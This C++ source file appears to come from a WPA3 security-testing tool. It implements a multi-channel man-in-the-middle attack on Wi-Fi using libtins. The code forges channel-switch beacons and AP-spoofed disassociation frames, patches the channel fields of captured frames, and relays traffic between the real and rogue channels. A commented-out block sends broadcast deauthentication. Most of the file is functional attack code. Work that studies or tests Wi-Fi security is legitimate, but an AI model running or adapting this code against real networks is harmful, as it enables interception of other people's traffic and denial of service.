#include "attacks/mc_mitm/mc_mitm.h"

#include <cstring>
#include <chrono>
#include <thread>
#include <utility>
#include <tins/tins.h>

#include "attacks/DoS_soft/channel_switch/channel_switch.h"
#include "attacks/mc_mitm/wifi_util.h"
#include "logger/log.h"
#include "system/hw_capabilities.h"

namespace wpa3_tester{
    using namespace std;
    using namespace chrono;
    using namespace Tins;

    McMitm::McMitm(string  nic_real,
                   string  nic_rogue,
                   string  ssid,
                   string  client_mac)
        : nic_real_ap(move(nic_real)),
          nic_rogue_ap(move(nic_rogue)),
          ssid(move(ssid)),
          client_mac(move(client_mac))
    {}

    McMitm::~McMitm() { stop(); }

    double McMitm::now_sec() {
        return duration<double>(steady_clock::now().time_since_epoch()).count();
    }

    ClientState* McMitm::find_client(const string& mac) {
        const auto it = clients.find(mac);
        return (it != clients.end()) ? it->second.get() : nullptr;
    }


    void McMitm::send_disas(const string& macaddr) const {
        Dot11Disassoc pkt;
        pkt.addr1(HWAddress<6>(macaddr));
        pkt.addr2(HWAddress<6>(ap_mac));
        pkt.addr3(HWAddress<6>(ap_mac));
        pkt.reason_code(0);
        sender_rogue->send(pkt, nic_real_ap);
        log(LogLevel::INFO, "Rogue channel: injected Disassociation to " + macaddr);
    }

    static uint16_t get_seq_num(const Dot11& pkt) {
        if (const auto* mgmt = pkt.find_pdu<Dot11ManagementFrame>())
            return mgmt->seq_num();
        if (const auto* data = pkt.find_pdu<Dot11Data>())
            return data->seq_num();
        return 0;
    }

    void McMitm::run(const int timeout_sec) {
        probe_resp.reset(beacon_to_probe_resp(*beacon, netconfig.rogue_channel));

        //FIXME this should be optimalization, how it should works?
        /*Dot11Deauthentication deauth;
        deauth.addr1(HWAddress<6>("ff:ff:ff:ff:ff:ff"));
        deauth.addr2(HWAddress<6>(ap_mac));
        deauth.addr3(HWAddress<6>(ap_mac));
        deauth.reason_code(3);
        RadioTap radio = RadioTap() / deauth;
        sender_real->send(radio, nic_real_mon);*/

        if (!sniffer_real || !sniffer_rogue) {
            log(LogLevel::ERROR, "Sniffers not initialized before run()");
            return;
        }
        if (!beacon) {
            log(LogLevel::ERROR, "Beacon not set before run()");
            return;
        }

        CSA_attack::send_CSA_beacon(ap_mac, nic_real_ap, ssid, netconfig.real_channel, netconfig.rogue_channel, 1);

       // CSA_attack::send_CSA_beacon(ap_mac, nic_real_mon, ssid,
       //                             netconfig.real_channel, netconfig.rogue_channel);

        last_real_beacon  = now_sec();
        last_rogue_beacon = now_sec();
        double next_beacon  = now_sec() + 0.01;
        const double deadline = (timeout_sec > 0) ? now_sec() + timeout_sec : -1.0;

        while (true) {
            if (deadline > 0 && now_sec() > deadline) {
                log(LogLevel::INFO, "McMitm timeout reached, stopping.");
                break;
            }

            auto try_sniff = [&](Sniffer& sniffer, void (McMitm::*handler)(PDU&)) {
                if (PDU* pdu = sniffer.next_packet()) {
                    (this->*handler)(*pdu);
                    delete pdu;
                }
            };

            try_sniff(*sniffer_real,  &McMitm::handle_rx_real_chan);
            try_sniff(*sniffer_rogue, &McMitm::handle_rx_rogue_chan);

            /*while (!disas_queue.empty() && disas_queue.top().first <= now_sec()) {
                string mac = disas_queue.top().second;
                disas_queue.pop();
                send_disas(mac);
            }*/

            if (next_beacon <= now_sec()) {
                CSA_attack::send_CSA_beacon(ap_mac, nic_real_ap, ssid, netconfig.real_channel,  netconfig.rogue_channel, 1);
                next_beacon += 0.10;
            }

            if (last_real_beacon + 2.0 < now_sec()) {
                log(LogLevel::WARNING, "Didn't receive beacon from real AP for two seconds");
                last_real_beacon = now_sec();
            }
            if (last_rogue_beacon + 2.0 < now_sec()) {
                log(LogLevel::WARNING, "Didn't receive beacon from rogue AP for two seconds");
                last_rogue_beacon = now_sec();
            }
            this_thread::sleep_for(milliseconds(1));
        }
    }

    void McMitm::stop() {
        log(LogLevel::INFO, "Cleaning up ...");
        sniffer_real.reset();
        sniffer_rogue.reset();
        sender_real.reset();
        sender_rogue.reset();
    }

    void McMitm::setup_ifaces(const ActorPtr &att_real, const string &client_mac, const ActorPtr &att_rogue, const string &ap_mac){
        att_real->setup_mac_addr(client_mac);
        att_rogue->setup_mac_addr(ap_mac);
        att_real->up_iface();
        att_rogue->up_iface();
        att_real->up_sniff_iface();
        att_rogue->up_sniff_iface();
    }

    void dump_hex(const string& label, const vector<uint8_t>& data, size_t limit = 64) {
        cerr << "--- " << label << " (size: " << data.size() << ") ---" << endl;
        for (size_t i = 0; i < min(data.size(), limit); ++i) {
            cerr << hex << setw(2) << setfill('0') << static_cast<int>(data[i]) << " ";
            if ((i + 1) % 16 == 0) cerr << endl;
        }
        cerr << dec << endl;
    }

    void McMitm::patch_channel_raw(vector<uint8_t> &raw, const uint8_t channel) {
        if (raw.size() < 4) return;
        //dump_hex("BEFORE PATCH", raw, 48);

        size_t effective_size = raw.size();
        RadioTap rt(raw.data(), raw.size());
        if ((rt.present() & RadioTap::FLAGS) && (rt.flags() & RadioTap::FCS)) {
            effective_size -= 4; // get off FCS
        }

        // 2. Patch RadioTap - frekvence (libtins vyřeší offsety za tebe)
        //FIXME radiohead dont change channel
        //constexpr uint16_t channel_flags = RadioTap::OFDM | RadioTap::TWO_GZ;
        //rt.channel(hw_capabilities::channel_to_freq(channel), channel_flags);

        const vector<uint8_t> rt_patched = rt.serialize();
        const uint16_t old_rt_len = raw[2] | (raw[3] << 8);

        const long   header_fixed    = old_rt_len + 24 + 12;
        vector new_raw(raw.begin(), raw.begin() + header_fixed);

        //std::cerr << "old_rt_len=" << old_rt_len
      //<< " rt_patched.size()=" << rt_patched.size() << std::endl;

        size_t pos = header_fixed; // Tag parsing
        while (pos + 2 <= effective_size) {
            const uint8_t id  = raw[pos];
            const uint8_t len = raw[pos + 1];

            if (pos + 2 + len > raw.size()) {
                cerr << "ERR: Malformed IE at pos " << pos << " (ID: " << static_cast<int>(id) << ")" << endl;
                break;
            }
            // Patching logic
            if (id == Dot11::DS_SET && len == 1) {
                cerr << "Patching DS from " << static_cast<int>(raw[pos+2])
         << " to " << static_cast<int>(channel) << " at pos " << pos << endl;
                raw[pos + 2] = channel; // DS Parameter
            } else if (id == Dot11::HT_OPERATION && len >= 1) {
                raw[pos + 2] = channel; // HT Operation
            }

            new_raw.insert(new_raw.end(), raw.begin() + static_cast<long>(pos), raw.begin() + static_cast<long>(pos) + 2 + len);
            pos += 2 + len;
        }

        raw = std::move(new_raw);
        //dump_hex("AFTER PATCH", raw, 48);
    }

    void McMitm::handle_rx_real_chan(PDU& pdu) {
        const auto* dot11 = pdu.find_pdu<Dot11>();
        if (!dot11) return;

        const string addr1 = dot11->addr1().to_string();
        string addr2;
        if (const auto* mgmt = pdu.find_pdu<Dot11ManagementFrame>())
            addr2 = mgmt->addr2().to_string();
        else if (const auto* data = pdu.find_pdu<Dot11Data>())
            addr2 = data->addr2().to_string();

        // Frames from client TO real AP — push back to rogue channel via CSA
        if (addr1 == ap_mac) {
            if (dot11->subtype() == Dot11::AUTH) {
                log(LogLevel::WARNING, "Client %s connecting on real channel, sending CSA", addr2.c_str());
                CSA_attack::send_CSA_beacon(ap_mac, nic_real_ap, ssid,
                                            netconfig.real_channel, netconfig.rogue_channel, 1);
            }
            print_rx(LogLevel::DEBUG, "Real channel", *dot11);
            return; // don't forward client→AP frames from real channel, they belong on rogue
        }

        // Frames from real AP — forward to rogue channel with patched channel IE
        if (addr2 == ap_mac) {
            if (dot11->subtype() == Dot11::BEACON)
                last_real_beacon = now_sec();

            // Serialize, patch raw bytes, resend
            auto raw = pdu.serialize();
            patch_channel_raw(raw, netconfig.rogue_channel);

            const uint16_t rt_len = *reinterpret_cast<const uint16_t*>(raw.data() + 2);
            RawPDU dot11_only(raw.data() + rt_len, raw.size() - rt_len);

            /*RadioTap rt;
            rt.inner_pdu(dot11_only);
            sender_rogue->send(rt, nic_rogue_ap);*/

            auto patched = RawPDU(raw.data(), raw.size());
            sender_rogue->send(patched, nic_rogue_ap);
            print_rx(LogLevel::INFO, "Real channel", *dot11, " -- MitM");
            return;
        }
    }

    void McMitm::handle_rx_rogue_chan(PDU& pdu) {
        auto* dot11 = pdu.find_pdu<Dot11>();
        if (!dot11) return;

        const string addr1 = dot11->addr1().to_string();
        string addr2;
        if (const auto* mgmt = pdu.find_pdu<Dot11ManagementFrame>())
            addr2 = mgmt->addr2().to_string();
        else if (const auto* data = pdu.find_pdu<Dot11Data>())
            addr2 = data->addr2().to_string();

        // Frames forwarded from real AP — our own frames coming back, ignore
        if (addr2 == ap_mac) {
            if (dot11->subtype() == Dot11::BEACON)
                last_rogue_beacon = now_sec();
            return;
        }

        // Frames from client -> AP
        if (addr1 == ap_mac) {
            print_rx(LogLevel::INFO, "Rogue channel", *dot11, " -- MitM'ing");
            sender_real->send(*dot11, nic_real_ap);
            return;
        }
    }

    string McMitm::frame_to_str(const Dot11& pkt) {
        ostringstream ss;

        if (pkt.type() == Dot11::MANAGEMENT) {
            const auto sub = pkt.subtype();
            if (sub == Dot11::BEACON)      { ss << "Beacon(seq="     << get_seq_num(pkt) << ")"; return ss.str(); }
            if (sub == Dot11::PROBE_REQ)   { ss << "ProbeReq(seq="   << get_seq_num(pkt) << ")"; return ss.str(); }
            if (sub == Dot11::PROBE_RESP)  { ss << "ProbeResp(seq="  << get_seq_num(pkt) << ")"; return ss.str(); }
            if (sub == Dot11::AUTH)        { ss << "Auth(seq="       << get_seq_num(pkt) << ")"; return ss.str(); }
            if (sub == Dot11::DEAUTH)      { ss << "Deauth(seq="     << get_seq_num(pkt) << ")"; return ss.str(); }
            if (sub == Dot11::ASSOC_REQ)   { ss << "AssoReq(seq="    << get_seq_num(pkt) << ")"; return ss.str(); }
            if (sub == Dot11::REASSOC_REQ) { ss << "ReassoReq(seq="  << get_seq_num(pkt) << ")"; return ss.str(); }
            if (sub == Dot11::ASSOC_RESP)  { ss << "AssoResp(seq="   << get_seq_num(pkt) << ")"; return ss.str(); }
            if (sub == Dot11::REASSOC_RESP){ ss << "ReassoResp(seq=" << get_seq_num(pkt) << ")"; return ss.str(); }
            if (sub == Dot11::DISASSOC)    { ss << "Disas(seq="      << get_seq_num(pkt) << ")"; return ss.str(); }
            if (sub == 13)                       { ss << "Action(seq="     << get_seq_num(pkt) << ")"; return ss.str(); }

        } else if (pkt.type() == Dot11::CONTROL) {
            if (pkt.subtype() == Dot11::BLOCK_ACK) return "BlockAck";
            if (pkt.subtype() == Dot11::RTS)       return "RTS";
            if (pkt.subtype() == Dot11::ACK)       return "Ack";

        } else if (pkt.type() == Dot11::DATA) {
            if (pkt.subtype() == Dot11::DATA_NULL)
            { ss << "Null(seq="    << get_seq_num(pkt) << ")"; return ss.str(); }
            if (pkt.subtype() == Dot11::QOS_DATA_NULL)
            { ss << "QoS-Null(seq=" << get_seq_num(pkt) << ")"; return ss.str(); }
        }

        ss << "Frame(type=" << static_cast<int>(pkt.type()) << ",sub=" << static_cast<int>(pkt.subtype()) << ")";
        return ss.str();
    }

    void McMitm::print_rx(const LogLevel level, const string& prefix,
                          const Dot11& pkt, const string& suffix) {
        if (pkt.type() == Dot11::CONTROL) return;

        string addr2;
        if (const auto* mgmt = pkt.find_pdu<Dot11ManagementFrame>()) {
            addr2 = mgmt->addr2().to_string();
        } else if (const auto* data = pkt.find_pdu<Dot11Data>()) {
            addr2 = data->addr2().to_string();
        }
        string msg = prefix + ": " +addr2 + " -> " +
                     pkt.addr1().to_string() + ": " + frame_to_str(pkt);
        if (!suffix.empty()) msg += suffix;
        log(level, msg);
    }

    double McMitm::display_client_traffic(const Dot11& pkt,
                                          const string& prefix,
                                          const double prevtime,
                                          const string& suffix) {
        const bool is_data = (pkt.type() == Dot11::DATA);
        const bool is_null = is_data && (pkt.subtype() == Dot11::DATA_NULL ||
                                         pkt.subtype() == Dot11::QOS_DATA_NULL);

        bool is_eapol = false;
        if (const auto* raw = pkt.find_pdu<RawPDU>()) {
            const auto& d = raw->payload();
            for (size_t i = 0; i + 1 < min(d.size(), static_cast<size_t>(16)); i++) {
                if (d[i] == 0x88 && d[i+1] == 0x8e) { is_eapol = true; break; }
            }
        }

        if (is_eapol)     print_rx(LogLevel::INFO,  prefix, pkt, suffix);
        else if (is_null) print_rx(LogLevel::DEBUG, prefix, pkt, suffix);
        else if (is_data) print_rx(LogLevel::INFO,  prefix, pkt, suffix);
        else              print_rx(LogLevel::DEBUG, prefix, pkt, suffix);

        return prevtime;
    }

}
